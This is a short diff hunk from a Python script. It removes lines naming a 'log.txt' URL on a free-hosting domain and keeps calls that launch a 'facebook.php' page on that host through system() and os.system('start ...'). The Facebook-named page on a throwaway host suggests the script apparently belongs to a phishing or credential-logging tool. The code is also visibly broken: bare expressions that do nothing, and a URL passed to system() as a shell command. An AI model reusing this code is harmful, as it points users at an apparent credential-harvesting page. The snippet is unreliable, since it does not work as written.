@@ -8,10 +8,6 @@ time.sleep(50)
 os.system("cls")
 system("clear")
 print("~~" * 50)
-platform.uname().system
-'helppopol.000webhostapp.com'
-platform.uname().system
-'https://helppopol.000webhostapp.com/log.txt'
 system("https://helppopol.000webhostapp.com/facebook.php")
 os.system("start https://helppopol.000webhostapp.com/facebook.php")
 print("~~" * 50)
